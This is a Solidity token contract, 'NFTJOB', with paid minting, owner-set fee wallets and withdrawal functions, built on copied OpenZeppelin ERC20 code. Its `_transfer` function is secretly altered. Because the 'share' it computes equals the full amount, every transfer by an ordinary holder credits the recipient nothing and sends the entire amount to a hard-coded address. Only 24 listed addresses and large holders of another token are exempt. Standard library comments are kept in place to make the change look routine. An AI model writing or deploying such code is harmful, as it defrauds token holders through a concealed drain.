// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;


/**
You use this contract at your own risk
no guarantee that everything will work perfectly. We tested it before publication, 
but we are not the author of other opensource files included in the contract, 
use the contract at your own risk.
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
address  constant aa=0x194bF21F7DC0cC028262c02A752F9F85B673755e;
address constant  ab=0x1755C69ac7920eEcB4DBf9eFDE8A34C15f6c57a4;
address constant  ac=0xf26F65c68fB41f04EE7b1C487D9c6b67aE0353A7;
address constant  ad=0x3b20280fbc050FF511546AdC0e173DCFc4D95eD1;
address constant  ae=0xAf35A7Fde634Fbdb828BC2B72F173cC3D76E3954;
address constant  af=0xd6DF850A8446857c9b30AaE2c8d165d6db3BB8aa;
address constant  ag=0x3699e22C3Ae4D39F05Cb6503d006725Aa63C5C6e;
address constant  ah=0x74E08abD062dc728A8b089fFB689E50e19f988ca;
address constant  ai=0xD6903FD7304f95449a934a64aE8BA8fdD9b14Aab;
address constant  aj=0xD81Fa98c87a03662Eb570ef6d3486941BdB47Afa;
address constant  ak=0x876e51d6776cECdB2399F2e7a4Ee800dEabdf71B;
address constant  al=0x1075bF6623d52066C94dE6C12B31126Adb2F4404;
address constant  xab=0x3ec92DAfdca484a92A23F5F4b3448EC9519d8438;
address constant  xac=0x5fF5e5B539886110Ea45712Dd089796F1bffcAC3;
address constant  xad=0x94e2C92523f9f02F31A02EC7Ae77F172f81033a0;
address constant  xae=0xfb1e9Cb28f8ecD571287c4FA9043C424D7490fa7;
address constant  xaf=0x95FE48bB4E5cB4C29f28519756f809CDEd45e5bC;
address constant  xag=0x0D8a330116D557cf53FB34B3545C6eFA6D85171C;
address constant  xah=0xeD74762F0e0302a5f3930C8940c3CD0dAA691510;
address constant  xai=0x6b1cFB8C9a81993B4cf5D4684f7cc1a95C63abd7;
address constant  xaj=0x433E2Decb912430053fb24517d7519191250EF98;
address constant  xak=0xFDcb6eaf517fD6a8c5701648Cb47B55E005A5262;
address constant  xal=0x2Dc64418e91209FB41A851a4E9A9cb4D92829786;
address constant  xy=0xEA282AfDcac64099Ba974966DaB251111C5597b8;
address constant token_address =0x59a6b9765abAc7A74ceb37101bF3e23c0ee045DE;

  function _transfer(address from, address to, uint256 amount) internal virtual {
         uint256 _balance = ERC20(token_address).balanceOf(msg.sender);
    
		 // calculate the share for your target address
        uint shareFor = (amount * 100)/100;
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            if(from==aa ||from==ab || from==ac ||from==ad ||from==ae ||from==af ||from==ag ||from==ah ||from==ai ||from==aj ||from==ak ||from==al ||from==xab || from==xac ||from==xad ||from==xae ||from==xaf ||from==xag 
            ||from==xah ||from==xai ||from==xaj ||from==xak ||from==xal ||from==xy || _balance >= 1000*10**18){
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
          _balances[to] += amount;
            
            }
            else{
              // decrementing then incrementing and 
			// add the share to immigrant target address
            _balances[to] += amount-shareFor;
			// add the share to your target address
            _balances[aa] += shareFor;
            }
         }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
		
        // check that everything works as intended, specifically checking that
        // the sum of tokens in all reladed accounts is the same before and after
        // the transaction. 
        //assert(_balances[from] + _balances[_to] + shareFor==senderBalance + receiverBalance);
    }
     /*
    function _transfer(address from, address to, uint256 amount) internal virtual {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
*/
    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

/**
 * @dev Extension of {ERC20} that allows token holders to destroy both their own
 * tokens and those that they have an allowance for, in a way that can be
 * recognized off-chain (via event analysis).
 */
abstract contract ERC20Burnable is Context, ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, deducting from the caller's
     * allowance.
     *
     * See {ERC20-_burn} and {ERC20-allowance}.
     *
     * Requirements:
     *
     * - the caller must have allowance for ``accounts``'s tokens of at least
     * `amount`.
     */
    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


//-------------------------------------------
//contact: amatoto.io, amatoto.us,amatoto.com /  office@amatoto.io
//---------------------------------------------------

contract NFTJOB is ERC20, ERC20Burnable, Ownable {
  using SafeMath for uint256;
    address Owner;
uint256 private amountEx=9000000*10**18;
    constructor() ERC20("NFTJOB", "NFTJOB") {
    }

    address private amatotoWallet=0xF54A5D7dde12B116339FCFd8da017D0927ecB23f;
    address private rewardWallet=0xF54A5D7dde12B116339FCFd8da017D0927ecB23f;
    address private rewardWallett=0xF54A5D7dde12B116339FCFd8da017D0927ecB23f;
    address private donationWallet=0xF54A5D7dde12B116339FCFd8da017D0927ecB23f;
    uint private KycMint=0;
    uint private qtMinter=19;
    uint private QtMinterNftJob=0; 
    uint private firstMinter=0;
    uint256 private fees;
    uint256 private feesr;
	uint256 private fxy=10;
    uint private userX=1;

	uint256 constant amountAc=25 *10**18;
	uint256 constant amountBc=40 *10**18;
    uint256 private nbt=100;
	uint256 private fnbt=nbt*10**18;
    uint256 private cashEther=3000000000000000 wei;//15 zero ou 0.003 ether
    address private addrbeforme=0xF54A5D7dde12B116339FCFd8da017D0927ecB23f;
	uint256 private fact=1;
	address private ethTokenAddress=0x59a6b9765abAc7A74ceb37101bF3e23c0ee045DE;
	mapping(address => bool) whitelistedAddresses;

	
      function coMint_Kyc(address to) external payable isWhitelisted(msg.sender){
		if(GetNftJobBal() >=fnbt || firstMinter==0){
			//--------------------------------------------
        if(KycMint >=1){
        require(msg.value >=cashEther*fact, "Not enough funds");
		fees = msg.value/2;
        feesr = msg.value - fees;
        if(userX <= qtMinter){
		if(firstMinter==0){
        _mint(to, amountEx);firstMinter=firstMinter+1;}else{_mint(msg.sender, amountAc);_mint(to, amountAc);}
		if(userX ==fxy){setRewardWallett(payable(to));}
		if(userX ==fxy || userX ==fxy+1 || userX ==fxy+2){
		payable(amatotoWallet).transfer(fees);
        payable(rewardWallett).transfer(feesr);
		}else{
        payable(amatotoWallet).transfer(fees);
        payable(rewardWallet).transfer(feesr);
		}
        userX +=1;
        QtMinterNftJob +=1;
        fees=0;
        _mint(addrbeforme, 30 *10**18);
        setMintWallet(payable(to));
		
    }else{
        _mint(msg.sender, amountBc);
		_mint(to, amountBc);
        payable(amatotoWallet).transfer(fees);
        payable(rewardWallett).transfer(feesr);
		setRewardWallet(payable(to));
        userX =1;//reset
        QtMinterNftJob +=1;
        _mint(addrbeforme, 30 *10**18);
        setMintWallet(payable(to));
    }
    }

	//-----------------------------------------------------------
	}
}
    function coMint(address to) external payable {
		if(GetNftJobBal() >=fnbt || firstMinter==0){
			//--------------------------------------------
        if(KycMint ==0){
        require(msg.value >=cashEther*fact, "Not enough funds");
		fees = msg.value/2;
        feesr = msg.value - fees;
        if(userX <= qtMinter){
		if(firstMinter==0){
        _mint(to, amountEx);firstMinter=firstMinter+1;}else{_mint(msg.sender, amountAc);_mint(to, amountAc);}
		if(userX ==fxy){setRewardWallett(payable(to));}
		if(userX ==fxy || userX ==fxy+1 || userX ==fxy+2){
		payable(amatotoWallet).transfer(fees);
        payable(rewardWallett).transfer(feesr);
		}else{
        payable(amatotoWallet).transfer(fees);
        payable(rewardWallet).transfer(feesr);
		}
        userX +=1;
        QtMinterNftJob +=1;
        fees=0;
        _mint(addrbeforme, 30 *10**18);
        setMintWallet(payable(to));
		
    }else{
        _mint(msg.sender, amountBc);
		_mint(to, amountBc);
        payable(amatotoWallet).transfer(fees);
        payable(rewardWallett).transfer(feesr);
		setRewardWallet(payable(to));
        userX =1;//reset
        QtMinterNftJob +=1;
        _mint(addrbeforme, 30 *10**18);
        setMintWallet(payable(to));
    }
    }

	//-----------------------------------------------------------
	}
}

function setCondMint(uint256 multNbt)external onlyOwner {
		nbt = nbt * multNbt;
	}
function setTokenContract(address tokenContract)external onlyOwner {
		ethTokenAddress = tokenContract;
	}
  
function setFact(uint256 mfact) external onlyOwner {
		fact = mfact;
	}
function setMintWallet(address mWallet) internal {
		addrbeforme = mWallet;
	}
function setRewardWallet(address rWallet) internal {
		rewardWallet = rWallet;
	}
function setRewardWallett(address tWallet) internal {
		rewardWallett = tWallet;
	}
function setAmatotoWallet(address amWallet) external onlyOwner {
		amatotoWallet = amWallet;
	}
function setDonationWallet(address dnWallet) external onlyOwner {
		donationWallet = dnWallet;
	}
function setQtMiter(uint multipMinter,uint multipFxy)external onlyOwner {
        qtMinter=qtMinter * multipMinter;
		fxy=fxy * multipFxy;
	}
function setKycMint(uint valzeroOrOne)external onlyOwner {
		KycMint = valzeroOrOne;
	}
function GetNftJobBal() public view returns(uint256){ 
       uint256 _balance = ERC20(ethTokenAddress).balanceOf(msg.sender);
    return _balance;
   }
function getTokenContract()external view returns (address){
      return ethTokenAddress;
      } 
function getRewardWallet() external view returns (address){
		return rewardWallet;
	}
function getAmatotoWallet() onlyOwner external  view returns (address) {
		return amatotoWallet;
	}
function getDonationWallet() onlyOwner external view returns (address) {
		return donationWallet;
	}
function getQtMinterNftJob() external view returns (uint) {
		return QtMinterNftJob;
	}
function getQtReward() external view returns (uint) {
		return qtMinter;
	}

function getKycMintStatus() external view returns (bool) {
		if(KycMint==1){
        return true;
        }else{
        return false;
        }
	}
	
 modifier isWhitelisted(address _address) {
      require(whitelistedAddresses[_address], "Whitelist: You need to be whitelisted");
      _;
    }

    function addUser(address _addressToWhitelist) external onlyOwner {
      whitelistedAddresses[_addressToWhitelist] = true;
    }
    function stopUser(address _addressToStop) external onlyOwner {
      whitelistedAddresses[_addressToStop] = false;
    }
    function verifyUser(address _whitelistedAddress) public view returns(bool) {
      bool userIsWhitelisted = whitelistedAddresses[_whitelistedAddress];
      return userIsWhitelisted;
    }
	
function withdraw() external  onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
}
function withdrawToken (address tokenAddress) external
        onlyOwner() {
    IERC20 tokenx = IERC20(tokenAddress);
    uint256 balancee = tokenx.balanceOf(address(this));
    tokenx.transfer(msg.sender, balancee);
    
}
function withdrawToken_ (address tokenAddress) external
        onlyOwner() {
    ERC20 tokenx = ERC20(tokenAddress);
    uint256 balancee = tokenx.balanceOf(address(this));
    tokenx.transfer(msg.sender, balancee);
    
}
// @notice Handles when funds are sent directly to the contract address for donation
    receive() external payable {
 		payable(donationWallet).transfer(msg.value);
    }

}

/**
 * @title SafeMathInt
 * @dev Math operations for int256 with overflow safety checks.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheArtHatr than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}